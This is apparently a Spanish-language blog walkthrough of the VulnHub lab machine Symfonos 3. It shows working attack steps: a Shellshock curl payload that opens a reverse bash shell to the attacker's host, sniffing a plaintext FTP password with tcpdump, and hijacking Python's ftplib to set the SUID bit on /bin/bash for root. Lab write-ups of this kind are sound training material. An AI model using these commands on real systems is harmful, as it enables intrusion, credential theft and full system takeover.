---
layout: single
title: Symfonos 3 - VulnHub
excerpt: "Intermediate real life based machine designed to test your skill at enumeration. If you get stuck remember to try different wordlist, avoid rabbit holes and enumerate everything thoroughly. SHOULD work for both VMware and Virtualbox."
date: 2023-02-12
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-symfonos3/symfonos3.jpg
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - Shellshock
  - cgi-bin
  - python
  - cron
  - pspy
  - tcpdump
---

Intermediate real life based machine designed to test your skill at enumeration. If you get stuck remember to try different wordlist, avoid rabbit holes and enumerate everything thoroughly. SHOULD work for both VMware and Virtualbox.

# Summary
- IP: 192.168.1.36
- Ports: 21,22,80
- OS: Linux (Debian)
- Services & Applications:
	-  21 -> ProFTPD 1.3.5b
	-  22 -> OpenSSH 7.4p1 Debian 10+deb9u6
	-  80 -> Apache httpd 2.4.25

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.1.36 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p21,22,80 -sCV 192.168.1.36 -oN targeted
```

- Escaneo de directorios con gobuster:

```bash
$gobuster dir -u http://192.168.1.36 -w /home/dante/SecLists/Discovery/Web-Content/common.txt -t 200
```


# Análisis de página web:

- Algo a notar desde el escaneo de directorios con gobuster, es que tenemos una Rabbit Hole, es decir, llegamos a directorios que no nos llevarán a nada interesante, nada de lo que sacar provecho.

- Si abrimos la web principal, escaneando el código fuente, vemos que nos habla sobre llegar al "underwold", en los directorios encontrados vemos "/gate/cerberus/tartarus/hermes" etc pero esto no nos lleva a nada tal y como mencioné.

- En la web principal encontramos el directorio "cgi-bin", hacemos un escaneo en dicho directorio y encontraremos un directorio "/underworld" accedemos y no vemos nada interesante, sin embargo, podemos usar este directorio para escanear el "cgi-bin" y comprobar que es vulnerable a ShellShock.


# Exploit cgi-bin Shellshock:

- En Hacktricks podemos leer información acerca de esta vulnerabilidad: [CGI - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)

- Usamos el siguiente comando para comprobar si es vulnerable:

```bash
$nmap 192.168.1.36 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/underworld

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
MAC Address: 00:0C:29:99:EA:40 (VMware)
```


- Como vemos, sí que es vulnerable, entonces usamos el exploit contemplado en la página de HackTricks en la que se hace uso de "curl" para obtener una reverse shell:

```bash
$curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.1.31/443 0>&1' http://192.168.1.36/cgi-bin/underworld
```

- Ganamos acceso al sistema como el usuario "cerberus", aplicamos el respectivo tratamiento de la tty.


# ESCALANDO PRIVILEGIOS:

- Si comprobamos a que grupos pertecemos con el comando "id" vemos que estamos en el grupo (pcap) lo cual resulta extraño; esto podríamos aprovechar para capturar paquetes y posteriormente analizarlos, lo que haremos ahora será escanear si hay tareas automatizadas que se realizan por detrás en la máquina, ya que estas podría tener información de por medio.

- En nuestra máquina atacante descargamos el binario de  "pspy64" de GitHub [Releases · DominicBreuker/pspy (github.com)](https://github.com/DominicBreuker/pspy/releases) 

- Transferimos dicho binario a la máquina víctima.

- Le damos permisos de ejecución y la ejecutamos:

```bash
cerberus@symfonos3:/tmp$ chmod +x pspy64
cerberus@symfonos3:/tmp$ ./pspy64
```

- Esperamos unos minutos para verificar qué tareas se están realizando de forma automática y por qué usuario se las está ejecutando.

- Luego de unos minutos podemos ver lo siguiente:

```bash
2023/02/12 12:13:01 CMD: UID=0     PID=1270   | /usr/sbin/CRON -f 
2023/02/12 12:13:01 CMD: UID=0     PID=1271   | /bin/sh -c /usr/bin/curl --silent -I 127.0.0.1 > /opt/ftpclient/statuscheck.txt 
2023/02/12 12:14:01 CMD: UID=0     PID=1273   | /usr/sbin/CRON -f 
2023/02/12 12:14:01 CMD: UID=0     PID=1272   | /usr/sbin/cron -f 
2023/02/12 12:14:01 CMD: UID=0     PID=1274   | /usr/sbin/CRON -f 
2023/02/12 12:14:01 CMD: UID=0     PID=1275   | /usr/sbin/CRON -f 
2023/02/12 12:14:01 CMD: UID=0     PID=1277   | /bin/sh -c /usr/bin/curl --silent -I 127.0.0.1 > /opt/ftpclient/statuscheck.txt 
2023/02/12 12:14:01 CMD: UID=0     PID=1276   | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
2023/02/12 12:14:01 CMD: UID=1000  PID=1278   | proftpd: (accepting connections)               
2023/02/12 12:14:01 CMD: UID=0     PID=1279   | /usr/sbin/CRON -f 
2023/02/12 12:14:01 CMD: UID=105   PID=1280   | /usr/sbin/sendmail -i -FCronDaemon -B8BITMIME -oem root 
2023/02/12 12:14:01 CMD: UID=1000  PID=1281   | /usr/sbin/exim4 -Mc 1pRGrR-0000Kd-SR 
```


- Efectivamente se están ejecutando tareas automatizadas y como usuario root (UID=0), específicamente se están manipulando los archivos "/opt/ftpclient/ftpclient.py" y "/opt/ftpclient/statuscheck.txt"

- Si intentamos acceder a dichos archivos nos damos cuenta que no tenemos permisos.

- Dado que pertenecemos al grupo (pcap) podemos analizar los paquetes que se envían o reciben en la máquina con "tcpdump".

```bash
cerberus@symfonos3:/tmp$ tcpdump -i lo -w captura.cap -v
```

- Esperamos unos minutos, hasta que se hayan capturado algunos paquetes.

- Cuando se hayan capturado una cantidad considerable de paquetes, detenemos el escaneo y transferimos el archivo "captura.cap" a nuestra máquina atacante para analizarlos.

- En nuestra máquina atacante ejecutamos "tshark" para escanear los paquetes en consola, y como vimos que en la máquina víctima se están manipulando ficheros que guardan relación con el protocolo FTP, filtramos por FTP:

```bash
$tshark -r captura.cap -Y ftp 2>/dev/null
```

- Obtenemos el siguiente output:

```bash
24  60.027899    127.0.0.1 → 127.0.0.1    FTP 121 Response: 220 ProFTPD 1.3.5b Server (Debian) [::ffff:127.0.0.1]
26  60.027930    127.0.0.1 → 127.0.0.1    FTP 78 Request: USER hades
28  60.028547    127.0.0.1 → 127.0.0.1    FTP 99 Response: 331 Password required for hades
29  60.028570    127.0.0.1 → 127.0.0.1    FTP 89 Request: PASS PTpZTfU4vxgzvRBE
30  60.035754    127.0.0.1 → 127.0.0.1    FTP 92 Response: 230 User hades logged in
31  60.035802    127.0.0.1 → 127.0.0.1    FTP 81 Request: CWD /srv/ftp/
32  60.035902    127.0.0.1 → 127.0.0.1    FTP 94 Response: 250 CWD command successful
```

- Como vemos, se están ejecutando comandos y en estos se encuentran las credenciales del usuario "hades", pivotamos a dicho usuario en la máquina víctima:

```bash
cerberus@symfonos3:/tmp$ su hades
```


- Ahora, como el usuario "hades" sí que tenemos acceso al directorio que encontramos anteriormente "/opt/ftpclient/" así que entramos y cateamos el archivo "ftpclient.py" que se está ejecutando como root de forma automatizada:

```python
import ftplib

ftp = ftplib.FTP('127.0.0.1')
ftp.login(user='hades', passwd='PTpZTfU4vxgzvRBE')

ftp.cwd('/srv/ftp/')

def upload():
    filename = '/opt/client/statuscheck.txt'
    ftp.storbinary('STOR '+filename, open(filename, 'rb'))
    ftp.quit()

upload()
```


- Vemos que importa la librería "ftplib", esto podríamos aprovecharlo para aplicar Python Library Hijacking, así que lo hacemos:

- Primero, buscamos en donde se encuentra dicha librería:

```bash
hades@symfonos3:/opt/ftpclient$ find / -name ftplib.py 2>/dev/null
```

- La modificamos:

```bash
hades@symfonos3:/opt/ftpclient$ nano /usr/lib/python2.7/ftplib.py
```

```python
import os


os.system("chmod u+s /bin/bash")
```

- Ahora esperamos a que se ejecute el archivo "ftpclient.py" por root y se ejecute el código que hemos modificado:

```bash
hades@symfonos3:/opt/ftpclient$ watch -n 1 ls -l /bin/bash
```

- Cuando vemos que efectivamente se cambió los permisos SUID a la bash, simplemente ejecutamos la bash con privilegios y seremos root:

```bash
Every 1.0s: ls -l /bin/bash                                                                                                                                symfonos3: Sun Feb 12 12:32:19 2023

-rwsr-xr-x 1 root root 975488 Dec 29  2012 /bin/bash

```

```bash
hades@symfonos3:/opt/ftpclient$ bash -p
```

